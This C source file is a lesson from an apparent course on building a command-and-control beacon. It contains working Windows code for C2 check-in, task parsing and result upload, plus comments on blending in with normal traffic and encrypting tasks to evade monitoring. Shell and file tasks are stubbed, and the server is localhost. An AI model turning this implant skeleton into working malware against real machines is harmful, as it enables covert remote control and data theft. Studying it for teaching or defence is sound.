/*
 * ========================================
 * LESSON 04: HTTP Check-in and Task Parsing
 * ========================================
 *
 * This lesson covers:
 * 1. How a beacon checks in to the C2 server
 * 2. How to parse task responses from the server
 * 3. Simple task structure and dispatching
 *
 * COMMUNICATION FLOW:
 *
 * 1. Beacon -> Server: "I'm here, any tasks for me?"
 * 2. Server -> Beacon: "Yes, execute this command"
 * 3. Beacon: Executes command
 * 4. Beacon -> Server: "Here are the results"
 *
 * ========================================
 */

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "wininet.lib")

/*
 * ========================================
 * TASK STRUCTURE
 * ========================================
 *
 * A task is a command from the C2 server.
 * This is a SIMPLIFIED version for learning.
 *
 * Real C2 frameworks use:
 * - Encrypted tasks
 * - Binary protocols (not JSON)
 * - Task queuing and prioritization
 */

#define TASK_TYPE_NONE     0
#define TASK_TYPE_SHELL    1
#define TASK_TYPE_SLEEP    2
#define TASK_TYPE_EXIT     3
#define TASK_TYPE_DOWNLOAD 4
#define TASK_TYPE_UPLOAD   5

typedef struct {
    DWORD dwTaskID;            // Unique task identifier
    DWORD dwTaskType;          // Type of task (shell, sleep, exit, etc.)
    char szCommand[1024];      // Command/parameter for the task
    DWORD dwCommandLength;     // Length of command data
} BEACON_TASK;

/*
 * ========================================
 * BEACON CONFIG (from previous lesson)
 * ========================================
 */

typedef struct {
    char szHost[256];
    DWORD dwPort;
    BOOL bUseSSL;
    char szBeaconID[65];
    char szUserAgent[512];
    char szCheckInPath[256];
    char szResultPath[256];
} BEACON_CONFIG;

/*
 * ========================================
 * HTTP CHECK-IN FUNCTION
 * ========================================
 */

BOOL BeaconCheckIn(BEACON_CONFIG* config, BEACON_TASK* task) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL bSuccess = FALSE;

    // Initialize task to NONE
    if (task) {
        ZeroMemory(task, sizeof(BEACON_TASK));
        task->dwTaskType = TASK_TYPE_NONE;
    }

    printf("[*] Initiating check-in to C2...\n");
    printf("    Server: %s:%d\n", config->szHost, config->dwPort);
    printf("    Path: %s\n", config->szCheckInPath);

    // Initialize WinINet
    hInternet = InternetOpenA(
        config->szUserAgent,
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, NULL, 0
    );

    if (!hInternet) {
        printf("[-] InternetOpenA failed: %d\n", GetLastError());
        return FALSE;
    }

    // Connect to C2 server
    hConnect = InternetConnectA(
        hInternet,
        config->szHost,
        (INTERNET_PORT)config->dwPort,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0
    );

    if (!hConnect) {
        printf("[-] InternetConnectA failed: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Open HTTP request
    // Add beacon ID as custom header for identification
    char szHeaders[512];
    _snprintf(szHeaders, sizeof(szHeaders),
              "X-Beacon-ID: %s\r\n",
              config->szBeaconID);

    DWORD dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (config->bUseSSL) {
        dwFlags |= INTERNET_FLAG_SECURE;
    }

    hRequest = HttpOpenRequestA(
        hConnect,
        "GET",
        config->szCheckInPath,
        NULL, NULL, NULL,
        dwFlags,
        0
    );

    if (!hRequest) {
        printf("[-] HttpOpenRequestA failed: %d\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Send request with beacon ID header
    if (!HttpSendRequestA(hRequest, szHeaders, -1, NULL, 0)) {
        printf("[-] HttpSendRequestA failed: %d\n", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    printf("[+] Check-in sent successfully\n");

    // Read response from server
    char buffer[4096] = {0};
    DWORD bytesRead = 0;

    if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
        if (bytesRead > 0) {
            buffer[bytesRead] = '\0';
            printf("[+] Received %d bytes from server\n", bytesRead);
            printf("[*] Response: %s\n", buffer);

            // Parse task from response
            if (task) {
                bSuccess = ParseTaskFromResponse(buffer, bytesRead, task);
            } else {
                bSuccess = TRUE;
            }
        } else {
            printf("[*] No data received (no tasks)\n");
            bSuccess = TRUE;  // No tasks is also success
        }
    } else {
        printf("[-] InternetReadFile failed: %d\n", GetLastError());
    }

    // Clean up
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return bSuccess;
}

/*
 * ========================================
 * TASK PARSING
 * ========================================
 *
 * Parse simple task format:
 *
 * TASK_ID:TASK_TYPE:COMMAND
 *
 * Example:
 * - "42:1:whoami" = Task ID 42, Shell command "whoami"
 * - "43:2:300" = Task ID 43, Sleep for 300 seconds
 * - "44:3:" = Task ID 44, Exit beacon
 *
 * Real C2 frameworks use JSON, Protocol Buffers, or custom binary formats.
 */

BOOL ParseTaskFromResponse(const char* response, DWORD responseLen, BEACON_TASK* task) {
    if (!response || responseLen == 0 || !task) {
        return FALSE;
    }

    // Check for "NOTASK" response
    if (strncmp(response, "NOTASK", 6) == 0) {
        printf("[*] No tasks from server\n");
        task->dwTaskType = TASK_TYPE_NONE;
        return TRUE;
    }

    // Parse format: TASK_ID:TASK_TYPE:COMMAND
    char responseCopy[4096];
    strncpy(responseCopy, response, sizeof(responseCopy) - 1);
    responseCopy[sizeof(responseCopy) - 1] = '\0';

    // Parse task ID
    char* token = strtok(responseCopy, ":");
    if (!token) {
        printf("[-] Failed to parse task ID\n");
        return FALSE;
    }
    task->dwTaskID = atoi(token);

    // Parse task type
    token = strtok(NULL, ":");
    if (!token) {
        printf("[-] Failed to parse task type\n");
        return FALSE;
    }
    task->dwTaskType = atoi(token);

    // Parse command (rest of string)
    token = strtok(NULL, "");  // Get rest of string
    if (token) {
        strncpy(task->szCommand, token, sizeof(task->szCommand) - 1);
        task->szCommand[sizeof(task->szCommand) - 1] = '\0';
        task->dwCommandLength = strlen(task->szCommand);
    } else {
        task->szCommand[0] = '\0';
        task->dwCommandLength = 0;
    }

    printf("[+] Parsed task: ID=%d, Type=%d, Command='%s'\n",
           task->dwTaskID, task->dwTaskType, task->szCommand);

    return TRUE;
}

/*
 * ========================================
 * TASK EXECUTION (SIMPLIFIED)
 * ========================================
 */

const char* GetTaskTypeName(DWORD taskType) {
    switch (taskType) {
        case TASK_TYPE_NONE:     return "NONE";
        case TASK_TYPE_SHELL:    return "SHELL";
        case TASK_TYPE_SLEEP:    return "SLEEP";
        case TASK_TYPE_EXIT:     return "EXIT";
        case TASK_TYPE_DOWNLOAD: return "DOWNLOAD";
        case TASK_TYPE_UPLOAD:   return "UPLOAD";
        default:                 return "UNKNOWN";
    }
}

void ExecuteTask(BEACON_TASK* task) {
    if (!task || task->dwTaskType == TASK_TYPE_NONE) {
        return;
    }

    printf("\n[*] Executing task #%d (%s)\n",
           task->dwTaskID,
           GetTaskTypeName(task->dwTaskType));

    switch (task->dwTaskType) {
        case TASK_TYPE_SHELL:
            printf("[*] Would execute shell command: %s\n", task->szCommand);
            printf("[!] (Not implemented in this demo - see Week 11)\n");
            break;

        case TASK_TYPE_SLEEP:
            printf("[*] Updating sleep time to: %s seconds\n", task->szCommand);
            // In real beacon, update config->dwSleepTime here
            break;

        case TASK_TYPE_EXIT:
            printf("[!] Exit task received - beacon will terminate\n");
            // In real beacon, set termination flag here
            break;

        case TASK_TYPE_DOWNLOAD:
            printf("[*] Would download file: %s\n", task->szCommand);
            printf("[!] (Not implemented in this demo)\n");
            break;

        case TASK_TYPE_UPLOAD:
            printf("[*] Would upload file: %s\n", task->szCommand);
            printf("[!] (Not implemented in this demo)\n");
            break;

        default:
            printf("[-] Unknown task type: %d\n", task->dwTaskType);
            break;
    }
}

/*
 * ========================================
 * SEND TASK RESULTS
 * ========================================
 */

BOOL SendTaskResult(BEACON_CONFIG* config, DWORD taskID, const char* result) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL bSuccess = FALSE;

    printf("[*] Sending task #%d results to C2...\n", taskID);

    // Build POST data: TASK_ID:RESULT
    char postData[8192];
    _snprintf(postData, sizeof(postData), "%d:%s", taskID, result);
    DWORD postDataLen = strlen(postData);

    // Initialize WinINet
    hInternet = InternetOpenA(
        config->szUserAgent,
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, NULL, 0
    );

    if (!hInternet) {
        printf("[-] InternetOpenA failed: %d\n", GetLastError());
        return FALSE;
    }

    // Connect to C2
    hConnect = InternetConnectA(
        hInternet,
        config->szHost,
        (INTERNET_PORT)config->dwPort,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0
    );

    if (!hConnect) {
        printf("[-] InternetConnectA failed: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Open POST request
    DWORD dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (config->bUseSSL) {
        dwFlags |= INTERNET_FLAG_SECURE;
    }

    hRequest = HttpOpenRequestA(
        hConnect,
        "POST",
        config->szResultPath,
        NULL, NULL, NULL,
        dwFlags,
        0
    );

    if (!hRequest) {
        printf("[-] HttpOpenRequestA failed: %d\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Send POST request with data
    const char* headers = "Content-Type: text/plain\r\n";
    if (HttpSendRequestA(hRequest, headers, -1, postData, postDataLen)) {
        printf("[+] Results sent successfully (%d bytes)\n", postDataLen);
        bSuccess = TRUE;
    } else {
        printf("[-] HttpSendRequestA failed: %d\n", GetLastError());
    }

    // Clean up
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return bSuccess;
}

/*
 * ========================================
 * DEMONSTRATION
 * ========================================
 */

int main(void) {
    printf("========================================\n");
    printf("BEACON CHECK-IN DEMONSTRATION\n");
    printf("========================================\n\n");

    // Initialize config
    BEACON_CONFIG config = {0};
    strcpy(config.szHost, "127.0.0.1");
    config.dwPort = 8080;
    config.bUseSSL = FALSE;
    strcpy(config.szBeaconID, "DEMO-BEACON-12345");
    strcpy(config.szUserAgent,
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           "AppleWebKit/537.36 (KHTML, like Gecko) "
           "Chrome/120.0.0.0 Safari/537.36");
    strcpy(config.szCheckInPath, "/api/beacon/check");
    strcpy(config.szResultPath, "/api/beacon/result");

    // Demonstrate task parsing
    printf("========================================\n");
    printf("TASK PARSING EXAMPLES\n");
    printf("========================================\n\n");

    const char* testResponses[] = {
        "NOTASK",
        "42:1:whoami",
        "43:2:120",
        "44:3:",
        "45:4:C:\\\\temp\\\\file.txt",
        NULL
    };

    for (int i = 0; testResponses[i] != NULL; i++) {
        printf("[*] Parsing: '%s'\n", testResponses[i]);

        BEACON_TASK task = {0};
        if (ParseTaskFromResponse(testResponses[i], strlen(testResponses[i]), &task)) {
            printf("[+] Success: Task ID=%d, Type=%s, Command='%s'\n\n",
                   task.dwTaskID,
                   GetTaskTypeName(task.dwTaskType),
                   task.szCommand);

            // Execute the task
            ExecuteTask(&task);
        } else {
            printf("[-] Parsing failed\n");
        }
        printf("\n");
    }

    // Demonstrate check-in (will fail without server, that's OK)
    printf("========================================\n");
    printf("HTTP CHECK-IN ATTEMPT\n");
    printf("========================================\n\n");

    printf("[*] NOTE: This will fail because no C2 server is running\n");
    printf("[*] In Week 11, we'll build the actual C2 server\n\n");

    BEACON_TASK task = {0};
    if (BeaconCheckIn(&config, &task)) {
        printf("\n[+] Check-in successful!\n");

        if (task.dwTaskType != TASK_TYPE_NONE) {
            printf("[*] Task received from server\n");
            ExecuteTask(&task);

            // Send simulated result
            SendTaskResult(&config, task.dwTaskID, "Task completed successfully");
        }
    } else {
        printf("\n[-] Check-in failed (expected - no server running)\n");
    }

    printf("\n");

    /*
     * KEY TAKEAWAYS:
     *
     * 1. CHECK-IN PROCESS
     *    - Beacon identifies itself (Beacon ID in header)
     *    - Server responds with task or "NOTASK"
     *    - Beacon parses task and executes
     *    - Results sent back to server
     *
     * 2. TASK STRUCTURE
     *    - Task ID: Unique identifier for tracking
     *    - Task Type: What kind of operation (shell, sleep, exit, etc.)
     *    - Command: Parameters for the task
     *
     * 3. HTTP HEADERS
     *    - User-Agent: Blend in with normal traffic
     *    - Custom headers: Beacon identification
     *    - Content-Type: Proper HTTP formatting
     *
     * 4. ERROR HANDLING
     *    - Network failures are EXPECTED
     *    - Beacon must be resilient
     *    - Retry logic (covered in exercises)
     *
     * REAL-WORLD IMPROVEMENTS:
     *
     * 1. Encryption:
     *    - All task data should be encrypted
     *    - Use AES, RC4, or custom encryption
     *    - Prevents network monitoring
     *
     * 2. Binary protocol:
     *    - Text protocols waste bandwidth
     *    - Binary is more efficient
     *    - Harder to analyze in network captures
     *
     * 3. Multiplexing:
     *    - Multiple tasks in one response
     *    - Reduces number of check-ins
     *    - More efficient operation
     *
     * 4. Authentication:
     *    - Verify server identity
     *    - Prevent beacon hijacking
     *    - Use pre-shared keys or certificates
     *
     * NEXT WEEK:
     * - Week 11: Command execution and output capture
     * - Build actual task handlers (shell, file ops, etc.)
     * - Create the C2 server to test beacon
     */

    return 0;
}

/*
 * ========================================
 * COMPILATION & EXECUTION
 * ========================================
 *
 * Compile:
 *   cl.exe 04-check-in.c /link wininet.lib
 *
 * Run:
 *   04-check-in.exe
 *
 * Expected output:
 *   - Shows task parsing examples
 *   - Demonstrates task execution (simulated)
 *   - Attempts HTTP check-in (will fail without server)
 *   - Shows how results would be sent
 *
 * ========================================
 */
